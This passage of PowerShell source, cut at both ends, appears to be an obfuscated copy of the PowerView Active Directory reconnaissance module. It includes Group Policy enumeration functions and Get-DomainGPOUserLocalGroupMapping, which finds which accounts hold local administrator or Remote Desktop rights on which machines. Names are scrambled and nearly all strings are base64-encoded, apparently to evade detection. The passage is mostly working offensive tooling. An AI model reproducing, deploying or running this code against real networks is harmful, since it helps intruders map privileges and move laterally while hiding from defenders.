                                ${/===\/\_/\__/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBwAGMAZgBpAGwAZQBzAHkAcwBwAGEAdABoAA=='))) ${_/\_/\/\_/=\___/=}
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $(${/===\/\_/\__/==\/}.distinguishedname)"
                            }
                        }
                        else {
                            ${/===\/\_/\__/==\/} = ____/=\__/\/=\__/= -Properties $_.Properties
                        }
                        ${/===\/\_/\__/==\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwA='))))
                    }
                    ${/===\/\_/\__/==\/}
                }
                if (${/==\_/=\____/===\}) {
                    try { ${/==\_/=\____/===\}.dispose() }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                    }
                }
                ${_/=\___/\_/=\____}.dispose()
            }
        }
    }
}
function _/==\___/\/\/==\__ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Switch]
        ${_/=\/\/=\_/\_/==\_},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\/==\/=\___/===} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/==\/=\___/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/==\/=\___/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/==\/=\___/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${__/=\/\_/\/==\/=\} = [System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        _/=\/\__/\/\/=\_/\ @/=\___/=\__/=\/\/ | % {
            ${/====\__/\/=\/=\/} = $_.displayname
            $GPOname = $_.name
            ${___/=\____/=\____} = $_.gpcfilesyspath
            ${_/\__/\_/\/\/\/\_} =  @{ 'GptTmplPath' = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8APQBcAF8AXwBfAF8ALwA9AFwAXwBfAF8AXwB9AFwATQBBAEMASABJAE4ARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAFMAZQBjAEUAZABpAHQAXABHAHAAdABUAG0AcABsAC4AaQBuAGYA'))) }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\__/\_/\/\/\/\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${______/==\/====\_} = _/==\/\/\/\/\_/\/= @_/\__/\_/\/\/\/\_
            if (${______/==\/====\_} -and (${______/==\/====\_}.psbase.Keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwACAATQBlAG0AYgBlAHIAcwBoAGkAcAA='))))) {
                ${___/===\_/\/\/==\} = @{}
                ForEach (${/\______/==\___/=} in ${______/==\/====\_}.'Group Membership'.GetEnumerator()) {
                    ${___/\__/\_/\_/\__}, $Relation = ${/\______/==\___/=}.Key.Split('__', ${__/=\/\_/\/==\/=\}) | % {$_.Trim()}
                    ${__/\/===\____/\/=} = ${/\______/==\___/=}.Value | ? {$_} | % { $_.Trim('*') } | ? {$_}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
                        ${_/===\_/=\_/=\___} = @()
                        ForEach (${/=\/\/\__/==\____} in ${__/\/===\____/\/=}) {
                            if (${/=\/\/\__/==\____} -and (${/=\/\/\__/==\____}.Trim() -ne '')) {
                                if (${/=\/\/\__/==\____} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                    ${/=\__/=\___/\__/\} = @{'ObjectName' = ${/=\/\/\__/==\____}}
                                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\__/=\___/\__/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                    ${/==\/===\/\/\_/==} = ___/===\/\/\_/\/\_ @/=\__/=\___/\__/\
                                    if (${/==\/===\/\/\_/==}) {
                                        ${_/===\_/=\_/=\___} += ${/==\/===\/\/\_/==}
                                    }
                                    else {
                                        ${_/===\_/=\_/=\___} += ${/=\/\/\__/==\____}
                                    }
                                }
                                else {
                                    ${_/===\_/=\_/=\___} += ${/=\/\/\__/==\____}
                                }
                            }
                        }
                        ${__/\/===\____/\/=} = ${_/===\_/=\_/=\___}
                    }
                    if (-not ${___/===\_/\/\/==\}[${___/\__/\_/\_/\__}]) {
                        ${___/===\_/\/\/==\}[${___/\__/\_/\_/\__}] = @{}
                    }
                    if (${__/\/===\____/\/=} -isnot [System.Array]) {${__/\/===\____/\/=} = @(${__/\/===\____/\/=})}
                    ${___/===\_/\/\/==\}[${___/\__/\_/\_/\__}].Add($Relation, ${__/\/===\____/\/=})
                }
                ForEach (${/\______/==\___/=} in ${___/===\_/\/\/==\}.GetEnumerator()) {
                    if (${/\______/==\___/=} -and ${/\______/==\___/=}.Key -and (${/\______/==\___/=}.Key -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcACoA'))))) {
                        ${/=\/=\_/\___/===\} = ${/\______/==\___/=}.Key.Trim('*')
                        if (${/=\/=\_/\___/===\} -and (${/=\/=\_/\___/===\}.Trim() -ne '')) {
                            ${___/===\/=\___/\/} = _/===\/=\_/\____/\ -__/\_/=\__/=\__/\ ${/=\/=\_/\___/===\} @_/\/==\/=\___/===
                        }
                        else {
                            ${___/===\/=\___/\/} = $False
                        }
                    }
                    else {
                        ${___/===\/=\___/\/} = ${/\______/==\___/=}.Key
                        if (${___/===\/=\___/\/} -and (${___/===\/=\___/\/}.Trim() -ne '')) {
                            if (${___/===\/=\___/\/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                                ${/=\/=\_/\___/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                            }
                            elseif (${___/===\/=\___/\/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                                ${/=\/=\_/\___/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                            }
                            elseif (${___/===\/=\___/\/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                                ${/=\/=\_/\___/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                            }
                            elseif (${___/===\/=\___/\/}.Trim() -ne '') {
                                ${/=\__/=\___/\__/\} = @{'ObjectName' = ${___/===\/=\___/\/}}
                                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\__/=\___/\__/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                ${/=\/=\_/\___/===\} = ___/===\/\/\_/\/\_ @/=\__/=\___/\__/\
                            }
                            else {
                                ${/=\/=\_/\___/===\} = $Null
                            }
                        }
                    }
                    ${/===\_/=\___/\/\/} = New-Object PSObject
                    ${/===\_/=\___/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${/====\__/\/=\/=\/}
                    ${/===\_/=\___/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
                    ${/===\_/=\___/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${___/=\____/=\____}
                    ${/===\_/=\___/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZABHAHIAbwB1AHAAcwA=')))
                    ${/===\_/=\___/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIAcwA='))) $Null
                    ${/===\_/=\___/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${___/===\/=\___/\/}
                    ${/===\_/=\___/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) ${/=\/=\_/\___/===\}
                    ${/===\_/=\___/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) ${/\______/==\___/=}.Value.Memberof
                    ${/===\_/=\___/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) ${/\______/==\___/=}.Value.Members
                    ${/===\_/=\___/\/\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBHAHIAbwB1AHAA'))))
                    ${/===\_/=\___/\/\/}
                }
            }
            ${_/\__/\_/\/\/\/\_} =  @{
                'GroupsXMLpath' = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8APQBcAF8AXwBfAF8ALwA9AFwAXwBfAF8AXwB9AFwATQBBAEMASABJAE4ARQBcAFAAcgBlAGYAZQByAGUAbgBjAGUAcwBcAEcAcgBvAHUAcABzAFwARwByAG8AdQBwAHMALgB4AG0AbAA=')))
            }
            __/=\_/\___/\/\___ @_/\__/\_/\/\/\/\_ | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
                    ${_/===\_/=\_/=\___} = @()
                    ForEach (${/=\/\/\__/==\____} in $_.GroupMembers) {
                        if (${/=\/\/\__/==\____} -and (${/=\/\/\__/==\____}.Trim() -ne '')) {
                            if (${/=\/\/\__/==\____} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                ${/=\__/=\___/\__/\} = @{'ObjectName' = ${___/===\/=\___/\/}}
                                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\__/=\___/\__/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                ${/==\/===\/\/\_/==} = ___/===\/\/\_/\/\_ -Domain $Domain -/=\_/\/\/=\__/\_/ ${/=\/\/\__/==\____}
                                if (${/==\/===\/\/\_/==}) {
                                    ${_/===\_/=\_/=\___} += ${/==\/===\/\/\_/==}
                                }
                                else {
                                    ${_/===\_/=\_/=\___} += ${/=\/\/\__/==\____}
                                }
                            }
                            else {
                                ${_/===\_/=\_/=\___} += ${/=\/\/\__/==\____}
                            }
                        }
                    }
                    $_.GroupMembers = ${_/===\_/=\_/=\___}
                }
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${/====\__/\/=\/=\/}
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAbwBsAGkAYwB5AFAAcgBlAGYAZQByAGUAbgBjAGUAcwA=')))
                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBHAHIAbwB1AHAA'))))
                $_
            }
        }
    }
}
function Get-DomainGPOUserLocalGroupMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\__/=\/\/\/=\/=} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ${__/\_/=\/=\/===\/} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) {
            ${__/\_/=\/=\/===\/} += ___/\___/\__/===\/ @/=\__/=\/\/\/=\/= -Identity $Identity | select -Expand objectsid
            ${_/\/\__/==\/===\_} = ${__/\_/=\/=\/===\/}
            if (-not ${__/\_/=\/=\/===\/}) {
                Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAFMASQBEACAAZgBvAHIAIABpAGQAZQBuAHQAaQB0AHkAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcA')))
            }
        }
        else {
            ${__/\_/=\/=\/===\/} = @('*')
        }
        if ($LocalGroup -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))) {
            ${/==\_/\/==\/=\_/=} = $LocalGroup
        }
        elseif ($LocalGroup -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAA==')))) {
            ${/==\_/\/==\/=\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
        }
        else {
            ${/==\_/\/==\/=\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
        }
        if (${__/\_/=\/=\/===\/}[0] -ne '*') {
            ForEach (${/=\_/==\__/==\/\_} in ${__/\_/=\/=\/===\/}) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABFAG4AdQBtAGUAcgBhAHQAaQBuAGcAIABuAGUAcwB0AGUAZAAgAGcAcgBvAHUAcAAgAG0AZQBtAGIAZQByAHMAaABpAHAAcwAgAGYAbwByADoAIAAnACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8APQA9AFwALwBcAF8AfQAnAA==')))
                ${__/\_/=\/=\/===\/} += ___/\/=========\/\ @/=\__/=\/\/\/=\/= -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))) -____/=\_/\/\_/\___ ${/=\_/==\__/==\/\_} | select -ExpandProperty objectsid
            }
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABUAGEAcgBnAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABTAEkARAA6ACAAJAB7AC8APQA9AFwAXwAvAFwALwA9AD0AXAAvAD0AXABfAC8APQB9AA==')))
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABFAGYAZgBlAGMAdABpAHYAZQAgAHQAYQByAGcAZQB0ACAAZABvAG0AYQBpAG4AIABTAEkARABzADoAIAAkAHsAXwBfAC8AXABfAC8APQBcAC8APQBcAC8APQA9AD0AXAAvAH0A')))
        ${_/===\__/\/\_/\__} = _/==\___/\/\/==\__ @/=\__/=\/\/\/=\/= -_/=\/\/=\_/\_/==\_ | % {
            ${/===\_/=\___/\/\/} = $_
            if (${/===\_/=\___/\/\/}.GroupSID -match ${/==\_/\/==\/=\_/=}) {
                ${/===\_/=\___/\/\/}.GroupMembers | ? {$_} | % {
                    if ( (${__/\_/=\/=\/===\/}[0] -eq '*') -or (${__/\_/=\/=\/===\/} -Contains $_) ) {
                        ${/===\_/=\___/\/\/}
                    }
                }
            }
            if ( (${/===\_/=\___/\/\/}.GroupMemberOf -contains ${/==\_/\/==\/=\_/=}) ) {
                if ( (${__/\_/=\/=\/===\/}[0] -eq '*') -or (${__/\_/=\/=\/===\/} -Contains ${/===\_/=\___/\/\/}.GroupSID) ) {
                    ${/===\_/=\___/\/\/}
                }
            }
        } | sort -Property GPOName -Unique
        ${_/===\__/\/\_/\__} | ? {$_} | % {
            $GPOname = $_.GPODisplayName
            ${__/===\/===\/\/==} = $_.GPOName
            ${___/=\____/=\____} = $_.GPOPath
            ${____/\/=\/==\__/\} = $_.GPOType
            if ($_.GroupMembers) {
                ${_/==\___/\/=\____} = $_.GroupMembers
            }
            else {
                ${_/==\___/\/=\____} = $_.GroupSID
            }
            ${_/\/\/==\__/=\/==} = $_.Filters
            if (${__/\_/=\/=\/===\/}[0] -eq '*') {
                ${_/\/\/===\/\/\___} = ${_/==\___/\/=\____}
            }
            else {
                ${_/\/\/===\/\/\___} = ${_/\/\__/==\/===\_}
            }
            ___/\/==\_/=\/==== @/=\__/=\/\/\/=\/= -Raw -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQA='))) -__/\_/\_/\/=\/\/=\ ${__/===\/===\/\/==} | % {
                if (${_/\/\/==\__/=\/==}) {
                    ${/=\/==\/\__/=\__/} = _/==\/\/\_______/\ @/=\__/=\/\/\/=\/= -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -SearchBase $_.Path | ? {$_.distinguishedname -match (${_/\/\/==\__/=\/==}.Value)} | select -ExpandProperty dnshostname
                }
                else {
                    ${/=\/==\/\__/=\__/} = _/==\/\/\_______/\ @/=\__/=\/\/\/=\/= -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))) -SearchBase $_.Path | select -ExpandProperty dnshostname
                }
                if (${/=\/==\/\__/=\__/}) {
                    if (${/=\/==\/\__/=\__/} -isnot [System.Array]) {${/=\/==\/\__/=\__/} = @(${/=\/==\/\__/=\__/})}
                    ForEach (${/=\_/==\__/==\/\_} in ${_/\/\/===\/\/\___}) {
                        $Object = ___/\___/\__/===\/ @/=\__/=\/\/\/=\/= -Identity ${/=\_/==\__/==\/\_} -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
                        ${____/==\/\/=\/=\/} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
